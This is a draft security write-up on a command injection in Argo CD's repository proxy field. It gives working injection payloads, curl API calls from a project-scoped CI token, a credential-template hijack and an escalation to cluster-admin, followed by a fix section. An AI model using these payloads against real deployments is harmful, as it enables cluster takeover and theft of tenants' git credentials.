@@ -5,3 +5,368 @@ summary: "A CI pipeline token scoped to one project is enough to run a shell on 
 banner: "/writing/argo-cd-command-injection-via-proxy-url/banner.svg"
 bannerAlt: "An attacker-controlled proxy URL flowing through ArgoCD into a GIT_SSH_COMMAND that executes a shell on the repo-server"
 ---
+
+Argo CD's repository object has a `proxy` field. It is there so a git host behind
+a SOCKS5 proxy can still be cloned, and it is as boring as it sounds - a URL you
+paste into a form, or one line of JSON in an API call. It has also, on every
+release since **v2.11.0**, been a shell.
+
+The interesting part is not the injection itself. It is how little you need to
+reach it: no admin, no valid SSH key, no reachable git host, and not even a
+completed TCP connection. A CI pipeline token scoped to a single project - the
+delegation pattern Argo CD's own documentation recommends - is enough.
+
+## The line that does it
+
+`SSHCreds.Environ()` builds the SSH command git will use. When a proxy is
+configured, it appends a `ProxyCommand` option, and it builds that option by
+interpolating the proxy's host and port into a single-quoted string:
+
+```go
+// util/git/creds.go:384 (master, f012788c4) — :364 on v3.3.4
+args = append(args, "-o", fmt.Sprintf("ProxyCommand='connect-proxy -S %s:%s -5 %%h %%p'",
+    parsedProxyURL.Hostname(),
+    parsedProxyURL.Port()))
+...
+env = append(env, "GIT_SSH_COMMAND="+strings.Join(args, " "))
+```
+
+Two facts turn this into command execution. The first is that `Hostname()` is
+attacker-controlled and is never escaped or validated - it is dropped straight
+between two single quotes. The second is that `GIT_SSH_COMMAND` is not an argv
+array. Git hands it to `/bin/sh -c`, so anything that closes the opening quote is
+parsed as shell.
+
+The environment goes to git through `runCredentialedCmd`
+(`util/git/client.go:1763`), which does the ordinary thing:
+
+```go
+cmd := exec.CommandContext(ctx, "git", args...)
+cmd.Env = append(cmd.Env, environ...)
+```
+
+The `ProxyCommand` interpolation arrived in
+[#15864](https://github.com/argoproj/argo-cd/pull/15864) (`9b27aeb1a`, January
+2024) and first shipped in v2.11.0. It is unchanged on master.
+
+## What survives url.Parse
+
+The proxy string is not passed through raw - it goes through Go's `url.Parse`
+first, and only `Hostname()` and `Port()` are used. That does filter the input,
+just not in a way that helps. Measuring which characters survive in the host
+component:
+
+```
+survives : ' " $ ( ) & ; < > * ! ~ ] + = , :
+blocked  : [ | ? ^ % { } (space) ` \ / @ #
+```
+
+`'`, `;`, `$`, `(` and `)` all get through, which is everything needed to close
+the quote and append commands. What is missing is the space and the forward
+slash - so the payload cannot contain a path, and cannot separate a command from
+its arguments the usual way.
+
+Neither is a real obstacle. `$IFS` expands to the shell's internal field
+separator, which both `dash` and `bash` initialise to space/tab/newline, so
+`cd$IFS..` word-splits into `cd ..` before execution. That gives relative
+navigation without a single `/` character, and argument separation without a
+single space:
+
+```
+socks5://a';cd$IFS..;cd$IFS..;id>pwned;id;'b:1080
+        └────────────── injected ──────────────┘
+```
+
+Rendered into the `ProxyCommand`, the quoting breaks open exactly where you would
+expect:
+
+```
+ProxyCommand='connect-proxy -S a';cd$IFS..;cd$IFS..;id>pwned;id;'b:1080 -5 %h %p'
+             └─ argo's quote ──┘ └── runs as shell ──┘└─ argo's quote ─┘
+```
+
+Driving Argo CD's own credential path with that value - `Repository.GetGitCreds()`
+into `SSHCreds.Environ()`, then handing the environment to git the way
+`runCredentialedCmd` does - shows the whole thing end to end on master:
+
+![Argo CD emitting a GIT_SSH_COMMAND with the injected commands outside its own quoting, git executing it, and the dropped file containing id output](/writing/argo-cd-command-injection-via-proxy-url/sink-direct.png?size=wide "Argo CD emits the broken quoting itself; git runs it; `id` output lands in a file and in git's error message.")
+
+Note the last line of git's output. The injected `id` wrote to stdout, stdout is
+the git protocol stream, and git has opinions about that: `fatal: protocol error:
+bad line length character: uid=`. **The command's output is returned to the
+caller in the error message.** That detail matters later.
+
+## Four validations that all look like they would catch this
+
+Argo CD is not careless about repositories. There are several places that look
+like they would stop a payload in a proxy field. None of them do.
+
+**`ParseProxyUrl()` exists, and validates the wrong thing.** It checks the URL
+scheme and nothing else (`types.go:3950`), and it is wired exclusively to
+*cluster* `proxyUrl` - never to repository or repocreds proxy. It would not help
+if it were: `socks5://a';id;'b:1080` is a perfectly well-formed SOCKS5 URL and
+passes it cleanly.
+
+**The connectivity test on repository create is skipped for exactly the repos an
+attacker can make.** `CreateRepository` calls `testRepo` only when
+`q.Repo.Project == ""` (`server/repository/repository.go:449`). A project-scoped
+repository - the only kind a project-scoped tenant can create - is never tested.
+
+**The repocreds route has no connectivity test at all.**
+`CreateRepositoryCredentials` (`server/repocreds/repocreds.go:92`) stores what it
+is given.
+
+**And the test that does exist could never see this.** `TestRepository`
+(`reposerver/repository/repository.go:3113`) calls `git.TestRepo`
+(`util/git/git.go:135`), which is pure in-memory go-git. It never execs a
+subprocess, so it neither triggers the payload nor detects it. Pointing it at a
+payload proxy is completely uneventful.
+
+The gap is structural: the only component that turns `proxy` into a shell string
+is the native git client in repo-server, and nothing on the API path that accepts
+the field knows that is where it ends up.
+
+## Path 1: a CI token, a repo, an app
+
+The first path needs `repositories, create` and `applications, create` scoped to
+one project. I ran it as an AppProject role token - `proj:ci:deployer`, holding
+exactly `repositories,create,ci/*`, `repositories,get,ci/*`,
+`applications,create,ci/*` and `applications,get,ci/*`. That is verbatim the CI
+delegation pattern in `docs/user-guide/projects.md`. An ordinary tenant account
+or SSO group with the same project-scoped grants works identically.
+
+Registering the repository is one call, and it returns `200` without any
+connectivity test:
+
+```bash
+curl -sk -X POST $API/api/v1/repositories -H "Authorization: Bearer $T" \
+  -H 'Content-Type: application/json' -d '{
+    "repo":"ssh://git@example.invalid/x/y.git","sshPrivateKey":"not-a-real-key",
+    "proxy":"socks5://a'\'';cd$IFS..;cd$IFS..;id>pwned;id;'\''b:1080","project":"ci"}'
+```
+
+The `sshPrivateKey` is the string `not-a-real-key`. It does not need to be a key,
+because `Environ()` only writes it to a temp file and passes the path to `ssh -i`
+- the shell parses `GIT_SSH_COMMAND` long before `ssh` ever reads the file.
+
+Then an Application pointing at that repository:
+
+```bash
+curl -sk -X POST "$API/api/v1/applications?validate=false" -H "Authorization: Bearer $T" \
+  -H 'Content-Type: application/json' -d '{
+    "metadata":{"name":"pwn-ci","namespace":"argocd"},
+    "spec":{"project":"ci","source":{"repoURL":"ssh://git@example.invalid/x/y.git","path":".",
+      "targetRevision":"0123456789abcdef0123456789abcdef01234567"},
+      "destination":{"server":"https://kubernetes.default.svc","namespace":"default"}}}'
+```
+
+The `targetRevision` is a 40-character hex string on purpose. `lsRemote`
+(`client.go:939`) recognises anything shaped like a commit SHA and short-circuits
+straight into a fetch instead of asking the remote to resolve it. The host is
+`example.invalid`, which does not resolve - and does not need to, because the
+injection fires while `/bin/sh` is still parsing the command line, before `ssh`
+attempts a single packet.
+
+`?validate=false` only skips the in-memory `TestRepository` call, which is a
+convenience, not a security control - a well-formed but unauthorised key against
+a reachable host removes the need for it entirely.
+
+Both calls return `200`:
+
+![Two API calls from a project-scoped CI token, both returning HTTP 200, the second registering the payload in the proxy field](/writing/argo-cd-command-injection-via-proxy-url/path1-register.png?size=wide "Two calls, both 200, from a CI pipeline token with no admin rights and no cluster access")
+
+Then you wait for the controller to reconcile. Creating an Application triggers
+one immediately, so the wait is short - the payload had executed inside
+repo-server **two seconds** after the second call returned:
+
+![cat of the dropped file inside argocd-repo-server showing uid=999(argocd)](/writing/argo-cd-command-injection-via-proxy-url/path1-pwned.png?size=wide "Command execution as uid=999(argocd) inside argocd-repo-server, two seconds after the API call")
+
+## The output comes back to you
+
+Because `id` wrote into the git protocol stream, git's parse failure carries the
+command's output - and Argo CD surfaces git errors in the Application's status,
+which the attacker can read with the `applications, get` they already hold.
+
+So the primitive is not blind. Fetching the Application with the same token that
+created it returns both the injected command line and the output of the command:
+
+![The attacker reading the Application status over the API, showing 'bad line length character: uid=' and the full injected ProxyCommand](/writing/argo-cd-command-injection-via-proxy-url/status-leak.png?size=wide "The Application's own status field hands the attacker the injected command line and its output")
+
+Note `StrictHostKeyChecking=yes` in that output. Host key checking is on, the key
+is a fake, the hostname does not resolve - and none of it matters, because the
+shell has already run the command by the time any of those checks would apply.
+
+## Path 2: one API call, no application permission
+
+The second path is worse, because it removes the Application entirely.
+
+`RepositoryCredentials` are credential templates matched to repositories by URL
+prefix. When a repository has no inline credentials of its own,
+`db.enrichCredsToRepo` (`util/db/repository.go:435`) merges the matching template
+into it via `CopyCredentialsFrom` (`repository_types.go:211`) - and that function
+copies `Proxy` and `NoProxy` along with the secrets. Its sibling
+`CopyCredentialsFromRepo` (`:157`) does not, which is a good hint that the proxy
+fields were an afterthought here.
+
+Matching is longest-prefix (`getRepositoryCredentialIndex`,
+`util/db/repository_secrets.go:615`). So `repositories, create` alone lets an
+attacker register a *longer* prefix than a legitimate credential set and win the
+match for someone else's repository.
+
+That is the whole exploit. One call:
+
+```bash
+curl -sk -X POST "$API/api/v1/repocreds" -H "Authorization: Bearer $T_ATK" \
+  -H 'Content-Type: application/json' -d '{
+    "url":"ssh://git@victim.invalid/team/app","sshPrivateKey":"not-a-real-key",
+    "proxy":"socks5://a'\'';cd$IFS..;cd$IFS..;id>pwned2;whoami>whoami2;id;'\''b:1080"}'
+```
+
+The attacker has no Application permission and creates no Application. The
+payload fires on **the victim's own reconcile of their own Application** 
+with no further attacker action at all:
+
+![One repocreds POST returning 200, then the payload output appearing 76 seconds later on the victim's own reconcile](/writing/argo-cd-command-injection-via-proxy-url/path2-fires.png?size=wide "One call, then nothing. The victim's own reconcile executes the payload.")
+
+The victim's Application was already failing benignly before any of this - its
+repository host does not resolve either, so its status read `Could not resolve
+hostname victim.invalid`. The attacker's credential template turned that same
+harmless, recurring failure into a recurring command execution.
+
+There is a real constraint on this path, and it cuts both ways. The repocreds
+route enforces its RBAC object as the **bare credential URL**, not
+`project/url` - so a project-scoped grant like `repositories, create, demo/*`
+cannot reach it at all. It needs a URL-matching object such as
+`repositories, create, *`. Both boundaries are worth measuring rather than
+assuming:
+
+![Two HTTP 403 responses, one for a project-scoped tenant reaching for repocreds and one for the repocreds attacker reaching for applications](/writing/argo-cd-command-injection-via-proxy-url/path2-boundaries.png?size=wide "The project-scoped tenant cannot reach repocreds; the repocreds attacker cannot create Applications. Neither needs the other's permission.")
+
+## Who can actually do this
+
+The severity of a command injection is mostly a question of who can reach it, so
+I enumerated it against a live v3.3.4 rather than reasoning about the policy
+engine:
+
+| Principal | Exploit? | Why |
+| --- | --- | --- |
+| `admin` / `role:admin` | Yes | `*` on `*`. Not interesting. |
+| `role:readonly` | No | `repositories, get` only (`assets/builtin-policy.csv:13`) |
+| **AppProject role JWT** (`proj:<proj>:<role>`) | **Yes** (path 1) | `validatePolicy` permits `repositories` as a project resource (`types.go:2748`) |
+| Account or SSO group, project-scoped `repositories,create` + `applications,create` | Yes (path 1) | The ordinary tenant |
+| Account or SSO group with `repositories,create,*` | Yes (path 2) | No application permission needed at all |
+| Account or SSO group with `repositories,create,<proj>/*` only | No | Cannot create an Application; repocreds rejects project-scoped objects |
+
+The third row is the one that sets the severity. Argo CD's documented pattern for
+giving a CI pipeline access is an AppProject role token, and `repositories,
+create` is an entirely natural grant for a pipeline that registers its own
+repos. The token above - `repositories,create,ci/*` plus
+`applications,create,ci/*`, nothing else - reached command execution in **two
+API calls and two seconds**.
+
+Every CI token shaped like the documentation suggests is a full RCE primitive
+against repo-server.
+
+## From a repo-server shell to cluster-admin
+
+A shell in repo-server is not automatically cluster-admin - repo-server's service
+account has no RBAC of its own. The escalation goes through what repo-server is
+*for*.
+
+repo-server renders the manifests that the application-controller applies. The
+controller holds a ClusterRole of `apiGroups/resources/verbs: ['*']` plus
+`nonResourceURLs: ['*']` (`manifests/install.yaml:31203`). It does enforce each
+project's `clusterResourceWhitelist` at sync time (`controller/sync.go:750`,
+`validateSyncPermissions`) - but it enforces it against *the project of the
+Application being synced*, not against whoever influenced the render.
+
+So poisoned output only lands if it is rendered for an Application in a
+cluster-scope-permitting project. That is close to universal: the built-in
+`default` project permits `{group: '*', kind: '*'}`, and essentially every
+platform or app-of-apps deployment runs at least one auto-syncing application
+there.
+
+The attacker is the same `proj:ci:deployer` CI token. Its project
+`ci` has an empty `clusterResourceWhitelist` and the token lacks
+`applications, sync` - it cannot sync a cluster-scoped resource itself, and
+returns `403` if it tries. The victim is `platform-bootstrap`, an auto-syncing
+application in `default` rendering directory manifests from a public repository
+the attacker does not control.
+
+The chain has three steps, and the middle one is the fiddly part:
+
+1. The proxy injection drops a `perl` implant and `setsid`-detaches it, so it
+   outlives the git fetch that spawned it.
+2. repo-server keeps each checkout at `/tmp/_argocd-repo/<uuid>`, `chmod 0000` at
+   rest and `0700` only for the duration of a generation
+   (`directoryPermissionInitializer`, `repository.go:2965`). But the tree is
+   *owned* by `argocd`, so the implant simply chmods it back. It learns which
+   tree to poison from the git subprocess's `/proc/<pid>/cwd`, then writes the
+   `ClusterRoleBinding` continuously to win the race against `git clean -ffdx`
+   before the render's `filepath.Walk` reads the directory (`findManifests`,
+   `repository.go:2216`).
+3. On `platform-bootstrap`'s next sync, the controller applies it.
+
+![The attacker's own sync attempt denied, then the tracking-id proving platform-bootstrap applied the binding, and can-i returning yes for the kube-system service account](/writing/argo-cd-command-injection-via-proxy-url/path4-clusteradmin.png?size=wide "The tracking-id proves the controller applied this through platform-bootstrap's render, not a direct API call")
+
+The `tracking-id` annotation is the part that makes this unambiguous. It reads
+`platform-bootstrap:rbac.authorization.k8s.io/ClusterRoleBinding:default/pwned-cluster-admin`
+- meaning the controller applied the object as part of that application's
+rendered output, not as a direct API call from anyone. The same token, asked to
+sync a cluster-scoped resource directly, is denied with `PermissionDenied`. So a
+CI pipeline token that could not create a single cluster-scoped object on its own
+ended up with a `kube-system` service account bound to `cluster-admin` - applied
+on its behalf by the one component in the system that is allowed to apply
+anything.
+
+## Why this is worse than a shell in a build pod
+
+Two things make repo-server a bad place to lose.
+
+**It holds every tenant's git credentials.** The `ManifestRequest` that
+repo-server receives carries a full `Repository` object
+(`repository.proto:11`) - including `Password`, `SSHPrivateKey` and
+`BearerToken` (`repository_types.go:27,29,57`). Code execution there is a
+position to harvest the credentials of every tenant whose applications reconcile
+through it, not just the attacker's own.
+
+**It is the trusted source of what gets applied.** Everything downstream of
+repo-server treats its output as the intended state of the cluster. That is the
+property Path 4 turns into cluster-admin.
+
+The shipped manifests are helpful in the wrong direction, too. repo-server's
+NetworkPolicy specifies `policyTypes: [Ingress]` only, so egress is unrestricted.
+`REDIS_PASSWORD` sits in the repo-server environment
+(`argocd-repo-server-deployment.yaml:27`). And both `connect-proxy` and
+`openssh-client` ship in the image, so the payload never needs to bring tooling
+with it. None of this requires weakening the default install - the injection
+arrives through the control plane's own reconcile loop, so the NetworkPolicy is
+fully intact throughout.
+
+The same credential path is also reachable from commit-server via `GetGitCreds`
+(`commitserver/commit/repo_client_factory.go:29`).
+
+## Fixing it
+
+The sink is the place to fix it. `Hostname()` and `Port()` should be rejected
+outright if they contain anything outside the legal host and port character sets
+- or, better, repo-server should stop building a shell string with untrusted text
+inside quotes at all. Quoting is not escaping, and a single-quoted context that
+an attacker can supply a `'` into is not a boundary.
+
+Validating at the API boundary is worth doing as well, on both create and update,
+for repositories *and* repocreds. Doing only repositories leaves the second path
+wide open, because `CopyCredentialsFrom` will happily propagate an unvalidated
+`proxy` from a credential template onto a repository that never had one.
+
+The more general lesson is about the distance between the two ends of this bug.
+The field is validated as a URL, and it is a valid URL. It is used as a shell
+fragment several packages away, in a different process, by code that has no idea
+the value was ever user-supplied. Scheme-only validation looked sufficient
+because at the point where the check lives, a URL is all it is.
+
+## Disclosure
+
+{/* TODO: fill in before publishing - reported to the Argo CD project; no fix or
+     advisory published yet. Do not publish this post with the payloads intact
+     until the advisory is out. */}
